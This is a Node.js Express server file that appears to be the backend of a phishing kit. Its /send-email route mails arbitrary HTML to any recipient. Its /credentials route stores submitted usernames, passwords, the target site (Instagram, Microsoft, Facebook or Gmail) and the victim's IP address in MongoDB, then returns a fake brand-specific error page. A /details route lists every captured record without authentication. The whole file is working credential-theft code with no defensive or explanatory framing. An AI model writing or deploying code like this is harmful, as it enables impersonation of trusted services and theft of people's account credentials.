import transporter from "./email/nodemailer.js";
import express from "express";
import cors from "cors";
import path from "path";
import connecttoDB from "./database/mongodb.js";
import Detail from "./models/detail.model.js";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
console.log(__dirname);

const app = express();
const PORT = process.env.PORT;

app.use(cors());
app.set("trust proxy", true);
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

app.post("/send-email", (req, res) => {
  const { email, htmlcontent, subject } = req.body;
  console.log("email content received");
  const mailOptions = {
    from: process.env.EMAIL,
    to: email,
    subject: subject,
    html: htmlcontent,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
      res.status(500).send({ success: false });
    } else {
      console.log("Email sent successfully:", info.response);
      res.status(200).send({ success: true });
    }
  });
});

app.post("/credentials", async (req, res) => {
  let pathjoin;
  const { username, password, website } = req.body;
  await Detail.insertOne({
    username,
    password,
    website,
    ipaddress: req.ip,
  });

  if (website == "Instagram") {
    pathjoin = path.join(__dirname, "public", "ierror.html");
  } else if (website == "Microsoft") {
    pathjoin = path.join(__dirname, "public", "merror.html");
  } else if (website == "Facebook") {
    pathjoin = path.join(__dirname, "public", "ferror.html");
  } else if (website == "Gmail") {
    pathjoin = path.join(__dirname, "public", "gerror.html");
  }
  console.log("Path to error.html:", pathjoin);

  res.sendFile(pathjoin, (err) => {
    if (err) {
      console.error("Error sending file:", err);
      res.status(500).send({ success: false, error: err.message });
    }
  });
});

app.get("/details", async (req, res) => {
  const response = await Detail.find({});
  res.status(200).json(response);
});

app.listen(PORT, async () => {
  console.log(`Server listening on ${PORT}`);
  await connecttoDB();
});
